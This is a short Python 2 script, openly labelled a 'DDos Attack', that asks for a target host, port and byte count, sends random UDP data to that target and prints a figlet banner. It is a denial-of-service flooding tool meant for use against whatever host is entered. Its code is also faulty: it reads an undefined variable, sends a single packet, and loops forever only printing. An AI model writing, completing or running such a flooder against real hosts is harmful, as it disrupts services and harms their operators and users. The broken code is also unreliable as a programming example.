#!/usr/bin/env python
# coding=utf-8
import os, sys
import time
import  socket
import random
#host && Port
target_host = raw_input("HOST :")
target_port = input("Port :")
target_packetes = input("Bytes :")
#packet
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(packetes)
sock.sendto(bytes, (target_host, target_port))
os.system("clear")
os.system("figlet DDos Attack")
#conexion_client
sent = 1
pysendfile = 0
while True:

 print(bytes, target_host, target_port)
            
